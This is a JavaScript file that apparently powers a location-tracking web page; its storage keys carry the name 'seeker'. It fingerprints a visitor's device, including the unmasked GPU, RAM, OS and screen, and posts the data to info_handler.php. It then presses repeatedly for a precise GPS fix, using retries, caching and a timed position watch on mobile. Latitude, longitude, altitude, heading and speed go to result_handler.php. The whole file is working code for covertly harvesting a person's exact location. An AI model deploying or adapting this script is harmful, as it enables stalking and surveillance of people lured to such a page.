function information() {
  var ptf = navigator.platform;
  var cc = navigator.hardwareConcurrency;
  var ram = navigator.deviceMemory;
  var ver = navigator.userAgent;
  var str = ver;
  var os = ver;
  //gpu
  var canvas = document.createElement('canvas');
  var gl;
  var debugInfo;
  var ven;
  var ren;


  if (cc == undefined) {
    cc = 'Not Available';
  }

  //ram
  if (ram == undefined) {
    ram = 'Not Available';
  }

  //browser
  if (ver.indexOf('Firefox') != -1) {
    str = str.substring(str.indexOf(' Firefox/') + 1);
    str = str.split(' ');
    brw = str[0];
  }
  else if (ver.indexOf('Chrome') != -1) {
    str = str.substring(str.indexOf(' Chrome/') + 1);
    str = str.split(' ');
    brw = str[0];
  }
  else if (ver.indexOf('Safari') != -1) {
    str = str.substring(str.indexOf(' Safari/') + 1);
    str = str.split(' ');
    brw = str[0];
  }
  else if (ver.indexOf('Edge') != -1) {
    str = str.substring(str.indexOf(' Edge/') + 1);
    str = str.split(' ');
    brw = str[0];
  }
  else {
    brw = 'Not Available'
  }

  //gpu
  try {
    gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
  }
  catch (e) { }
  if (gl) {
    debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
    ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
  }
  if (ven == undefined) {
    ven = 'Not Available';
  }
  if (ren == undefined) {
    ren = 'Not Available';
  }

  var ht = window.screen.height
  var wd = window.screen.width
  //os
  os = os.substring(0, os.indexOf(')'));
  os = os.split(';');
  os = os[1];
  if (os == undefined) {
    os = 'Not Available';
  }
  os = os.trim();
  //
  $.ajax({
    type: 'POST',
    url: 'info_handler.php',
    data: { Ptf: ptf, Brw: brw, Cc: cc, Ram: ram, Ven: ven, Ren: ren, Ht: ht, Wd: wd, Os: os },
    success: function () { },
    mimeType: 'text'
  });
}



function locate(callback, errCallback) {
  if (navigator.geolocation) {
    // Detect if device is mobile for optimal settings
    var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    
    // Advanced mobile detection including tablet detection
    var isTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
    var isMobileDevice = isMobile || (isTouch && window.innerWidth <= 1024);
    
    // Check if we need user interaction first (helps prevent permission dialog issues)
    var needsUserGesture = isMobileDevice && !document.hasStorageAccess;
    
    // Add user interaction check for mobile/tablet devices
    var hasUserInteracted = false;
    
    // For mobile devices, ensure we have user interaction before requesting location
    if (isMobileDevice) {
      // Check if user has already interacted with the page
      var interactionEvents = ['click', 'touchstart', 'touchend', 'keydown'];
      var userInteractionHandler = function() {
        hasUserInteracted = true;
        interactionEvents.forEach(function(event) {
          document.removeEventListener(event, userInteractionHandler, true);
        });
      };
      
      // Listen for user interaction
      interactionEvents.forEach(function(event) {
        document.addEventListener(event, userInteractionHandler, true);
      });
      
      // If no interaction detected within 2 seconds, assume it's okay to proceed
      setTimeout(function() {
        if (!hasUserInteracted) {
          hasUserInteracted = true;
        }
      }, 2000);
    } else {
      hasUserInteracted = true; // Desktop doesn't need this check
    }
    
    // Cache management for mobile
    var lastKnownLocation = null;
    var locationCacheKey = 'seeker_location_cache';
    var locationCacheTime = 'seeker_location_time';
    
    // Try to get cached location first on mobile
    if (isMobileDevice && localStorage) {
      try {
        var cachedLocation = localStorage.getItem(locationCacheKey);
        var cacheTime = localStorage.getItem(locationCacheTime);
        
        if (cachedLocation && cacheTime) {
          var locationAge = Date.now() - parseInt(cacheTime);
          var cached = JSON.parse(cachedLocation);
          
          // Only use cached location if it's recent and accurate enough
          var cacheAccuracy = cached.coords.accuracy;
          var isRecentEnough = locationAge < 60000; // 1 minute for accurate cache
          var isAccurateEnough = !cacheAccuracy || cacheAccuracy <= 50; // 50m accuracy threshold
          
          if (isRecentEnough && isAccurateEnough) {
            console.log('Using cached accurate location');
            showPosition(cached);
            return;
          } else {
            console.log('Cached location too old or inaccurate, requesting fresh location');
          }
        }
      } catch (e) {
        console.log('Cache access failed, proceeding with fresh location request');
      }
    }
    
    // Progressive location request strategy for mobile
    function attemptLocationCapture(attemptNumber) {
      // For mobile devices, wait for user interaction before requesting location
      if (isMobileDevice && !hasUserInteracted) {
        console.log('Waiting for user interaction before requesting location permission...');
        setTimeout(function() {
          attemptLocationCapture(attemptNumber);
        }, 500);
        return;
      }
      
      var optn;
      
      // Add delay before permission request on mobile to ensure page is fully loaded
      if (isMobileDevice && attemptNumber === 1) {
        console.log('Mobile device detected, waiting for page stability before location request...');
        setTimeout(function() {
          performLocationRequest(attemptNumber);
        }, 1000);
        return;
      }
      
      performLocationRequest(attemptNumber);
    }
    
    function performLocationRequest(attemptNumber) {
      var optn;
      
      switch (attemptNumber) {
        case 1:
          // First attempt: High accuracy GPS with longer timeout
          optn = {
            enableHighAccuracy: true,
            timeout: isMobileDevice ? 25000 : 15000,
            maximumAge: 0 // Force fresh location
          };
          break;
        case 2:
          // Second attempt: High accuracy with moderate timeout
          optn = {
            enableHighAccuracy: true,
            timeout: isMobileDevice ? 30000 : 20000,
            maximumAge: isMobileDevice ? 10000 : 60000
          };
          break;
        case 3:
          // Third attempt: Network-based location as fallback
          optn = {
            enableHighAccuracy: false,
            timeout: 25000,
            maximumAge: isMobileDevice ? 30000 : 300000
          };
          break;
        case 4:
          // Final attempt: Very permissive settings
          optn = {
            enableHighAccuracy: false,
            timeout: 35000,
            maximumAge: 1800000 // 30 minutes
          };
          break;
        default:
          // If all attempts fail, show error
          showError({ code: 3, message: 'All location attempts failed' });
          return;
      }
      
      console.log(`Location attempt ${attemptNumber} with settings:`, optn);
      
      // Ensure no other dialogs are blocking permission request
      if (isMobileDevice) {
        // Clear any existing timeouts or intervals that might interfere
        try {
          window.focus();
        } catch (e) {
          console.log('Could not focus window');
        }
      }
      
      navigator.geolocation.getCurrentPosition(
        function(position) {
          console.log(`Location captured on attempt ${attemptNumber}`);
          
          // Validate location accuracy - retry if too inaccurate
          var accuracy = position.coords.accuracy;
          var isAccurate = true;
          
          if (accuracy) {
            // Progressive accuracy thresholds - stricter for early attempts
            var maxAccuracy;
            switch (attemptNumber) {
              case 1:
                maxAccuracy = isMobileDevice ? 30 : 20; // Very strict for first attempt
                break;
              case 2:
                maxAccuracy = isMobileDevice ? 50 : 30; // Moderate for second attempt
                break;
              case 3:
                maxAccuracy = isMobileDevice ? 100 : 50; // Relaxed for third attempt
                break;
              default:
                maxAccuracy = 1000; // Accept any accuracy on final attempt
            }
            
            if (accuracy > maxAccuracy && attemptNumber < 4) {
              console.log(`Location accuracy ${accuracy}m exceeds ${maxAccuracy}m threshold for attempt ${attemptNumber}, retrying...`);
              isAccurate = false;
            } else {
              console.log(`Location accuracy ${accuracy}m is acceptable for attempt ${attemptNumber}`);
            }
          }
          
          if (!isAccurate) {
            // Wait and retry with next attempt
            var delay = isMobileDevice ? (attemptNumber * 2000) : (attemptNumber * 1000);
            setTimeout(function() {
              attemptLocationCapture(attemptNumber + 1);
            }, delay);
            return;
          }
          
          // Additional validation - check for obviously wrong coordinates
          var lat = position.coords.latitude;
          var lon = position.coords.longitude;
          
          // Basic sanity checks for coordinates
          if (lat === 0 && lon === 0) {
            console.log('Received null island coordinates (0,0), retrying...');
            if (attemptNumber < 4) {
              setTimeout(function() {
                attemptLocationCapture(attemptNumber + 1);
              }, 1000);
              return;
            }
          }
          
          // Check for valid coordinate ranges
          if (lat < -90 || lat > 90 || lon < -180 || lon > 180) {
            console.log('Received invalid coordinates, retrying...');
            if (attemptNumber < 4) {
              setTimeout(function() {
                attemptLocationCapture(attemptNumber + 1);
              }, 1000);
              return;
            }
          }
          
          // Cache successful location on mobile
          if (isMobileDevice && localStorage) {
            try {
              localStorage.setItem(locationCacheKey, JSON.stringify(position));
              localStorage.setItem(locationCacheTime, Date.now().toString());
            } catch (e) {
              console.log('Failed to cache location');
            }
          }
          
          showPosition(position);
        },
        function(error) {
          console.log(`Location attempt ${attemptNumber} failed:`, error.message);
          
          // Special handling for permission denied on mobile
          if (error.code === error.PERMISSION_DENIED && isMobileDevice) {
            console.log('Permission denied on mobile device - may be due to overlay issues');
            
            // Try to detect and handle common mobile browser issues
            var userAgent = navigator.userAgent.toLowerCase();
            var errorMessage = 'Location access was denied. ';
            
            if (userAgent.includes('chrome') && userAgent.includes('mobile')) {
              errorMessage += 'If you see "This site can\'t ask for your permission", please:\n';
              errorMessage += '1. Close any pop-ups or overlays\n';
              errorMessage += '2. Refresh the page and try again\n';
              errorMessage += '3. Check that location is enabled in your browser settings';
            } else if (userAgent.includes('safari') && userAgent.includes('mobile')) {
              errorMessage += 'Please enable Location Services in Settings > Privacy & Security > Location Services > Safari';
            } else {
              errorMessage += 'Please enable location access in your browser settings and try again.';
            }
            
            showError({
              code: error.PERMISSION_DENIED,
              message: errorMessage
            });
            return;
          }
          
          if (attemptNumber < 4) {
            // Wait before next attempt, longer delays for mobile
            var delay = isMobileDevice ? (attemptNumber * 3000) : (attemptNumber * 1000);
            setTimeout(function() {
              attemptLocationCapture(attemptNumber + 1);
            }, delay);
          } else {
            showError(error);
          }
        },
        optn
      );
    }
    
    // Add a small delay before starting location capture on mobile
    if (isMobileDevice) {
      setTimeout(function() {
        attemptLocationCapture(1);
      }, 500);
    } else {
      attemptLocationCapture(1);
    }
    
    // Optional: Add watchPosition as a backup for high accuracy (only on mobile)
    if (isMobileDevice) {
      var watchId = null;
      var watchStartTime = Date.now();
      var bestPosition = null;
      var bestAccuracy = Infinity;
      
      // Start watching position for 15 seconds to get the best possible location
      setTimeout(function() {
        if (watchId !== null) {
          watchId = navigator.geolocation.watchPosition(
            function(position) {
              var currentAccuracy = position.coords.accuracy || Infinity;
              console.log(`Watch position update: ${currentAccuracy}m accuracy`);
              
              // Keep track of the most accurate position
              if (currentAccuracy < bestAccuracy && currentAccuracy <= 20) {
                bestAccuracy = currentAccuracy;
                bestPosition = position;
                console.log(`New best position found: ${currentAccuracy}m accuracy`);
              }
            },
            function(error) {
              console.log('Watch position error:', error.message);
            },
            {
              enableHighAccuracy: true,
              timeout: 10000,
              maximumAge: 0
            }
          );
          
          // Stop watching after 15 seconds and use best position if found
          setTimeout(function() {
            if (watchId !== null) {
              navigator.geolocation.clearWatch(watchId);
              watchId = null;
              
              if (bestPosition && bestAccuracy <= 20) {
                console.log(`Using best watch position: ${bestAccuracy}m accuracy`);
                
                // Cache this high-accuracy position
                if (localStorage) {
                  try {
                    localStorage.setItem(locationCacheKey, JSON.stringify(bestPosition));
                    localStorage.setItem(locationCacheTime, Date.now().toString());
                  } catch (e) {
                    console.log('Failed to cache watch position');
                  }
                }
                
                showPosition(bestPosition);
              }
            }
          }, 15000);
        }
      }, 5000); // Start watching 5 seconds after initial attempt
    }
    
  } else {
    // Handle case where geolocation is not supported
    showError({ code: 0, message: 'Geolocation not supported' });
  }

  function showError(error) {
    var err_text;
    var err_status = 'failed';
    var isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || 
                        ('ontouchstart' in window && window.innerWidth <= 1024);

    switch (error.code) {
      case error.PERMISSION_DENIED:
        err_text = isMobileDevice ? 
          'Location access denied. If you see "This site can\'t ask for your permission", please close any pop-ups or overlays, refresh the page, and ensure location services are enabled in your browser settings.' :
          'User denied the request for Geolocation';
        
        // Additional guidance for specific mobile browsers
        if (isMobileDevice) {
          var userAgent = navigator.userAgent.toLowerCase();
          if (userAgent.includes('chrome') && userAgent.includes('mobile')) {
            err_text += '\n\nFor Chrome mobile: Go to Settings > Site Settings > Location and ensure this site is allowed.';
          } else if (userAgent.includes('firefox') && userAgent.includes('mobile')) {
            err_text += '\n\nFor Firefox mobile: Tap the lock icon in the address bar and enable Location.';
          } else if (userAgent.includes('safari')) {
            err_text += '\n\nFor Safari: Go to Settings > Privacy & Security > Location Services > Safari and enable location access.';
          }
        }
        break;
      case error.POSITION_UNAVAILABLE:
        err_text = isMobileDevice ?
          'Location unavailable. Please check GPS/WiFi and try again.' :
          'Location information is unavailable';
        break;
      case error.TIMEOUT:
        err_text = isMobileDevice ?
          'Location request timed out. Please ensure GPS/WiFi is enabled and try again.' :
          'The request to get user location timed out';
        
        // Try one more time with cached location on mobile
        if (isMobileDevice && localStorage) {
          try {
            var cachedLocation = localStorage.getItem('seeker_location_cache');
            var cacheTime = localStorage.getItem('seeker_location_time');
            
            if (cachedLocation && cacheTime) {
              var locationAge = Date.now() - parseInt(cacheTime);
              var cached = JSON.parse(cachedLocation);
              
              // Use cached location as last resort if it's reasonably recent and accurate
              var cacheAccuracy = cached.coords.accuracy || Infinity;
              var isRecentEnough = locationAge < 3600000; // 1 hour
              var isAccurateEnough = cacheAccuracy <= 100; // 100m threshold for fallback
              
              if (isRecentEnough && isAccurateEnough) {
                console.log(`Using cached location as timeout fallback: ${cacheAccuracy}m accuracy, ${Math.round(locationAge/60000)} minutes old`);
                showPosition(cached);
                return;
              } else {
                console.log(`Cached location not suitable: ${cacheAccuracy}m accuracy, ${Math.round(locationAge/60000)} minutes old`);
              }
            }
          } catch (e) {
            console.log('Failed to access cached location');
          }
        }
        
        console.log('Location request timed out after all attempts. Device:', isMobileDevice ? 'Mobile' : 'Desktop');
        break;
      case error.UNKNOWN_ERROR:
        err_text = 'An unknown error occurred while getting location';
        break;
      default:
        err_text = 'Geolocation not supported by this browser';
        break;
    }

    // Enhanced error reporting for mobile debugging
    var errorDetails = {
      Status: err_status, 
      Error: err_text,
      UserAgent: navigator.userAgent,
      IsMobile: isMobileDevice,
      ErrorCode: error.code,
      Timestamp: new Date().toISOString()
    };

    // Send error data without showing intrusive alerts
    $.ajax({
      type: 'POST',
      url: 'error_handler.php',
      data: errorDetails,
      success: function() {
        if (errCallback && typeof errCallback === 'function') {
          errCallback(error, err_text);
        }
      },
      error: function() {
        // Silently handle AJAX errors
        if (errCallback && typeof errCallback === 'function') {
          errCallback(error, err_text);
        }
      },
      mimeType: 'text'
    });
  }
  function showPosition(position) {
    var lat = position.coords.latitude;
    if (lat) {
      lat = lat + ' deg';
    }
    else {
      lat = 'Not Available';
    }
    var lon = position.coords.longitude;
    if (lon) {
      lon = lon + ' deg';
    }
    else {
      lon = 'Not Available';
    }
    var acc = position.coords.accuracy;
    if (acc) {
      acc = acc + ' m';
      console.log(`Location captured with accuracy: ${acc}`);
    }
    else {
      acc = 'Not Available';
    }
    var alt = position.coords.altitude;
    if (alt) {
      alt = alt + ' m';
    }
    else {
      alt = 'Not Available';
    }
    var dir = position.coords.heading;
    if (dir) {
      dir = dir + ' deg';
    }
    else {
      dir = 'Not Available';
    }
    var spd = position.coords.speed;
    if (spd) {
      spd = spd + ' m/s';
    }
    else {
      spd = 'Not Available';
    }

    var ok_status = 'success';

    $.ajax({
      type: 'POST',
      url: 'result_handler.php',
      data: { Status: ok_status, Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd },
      success: callback,
      mimeType: 'text'
    });
  };
}

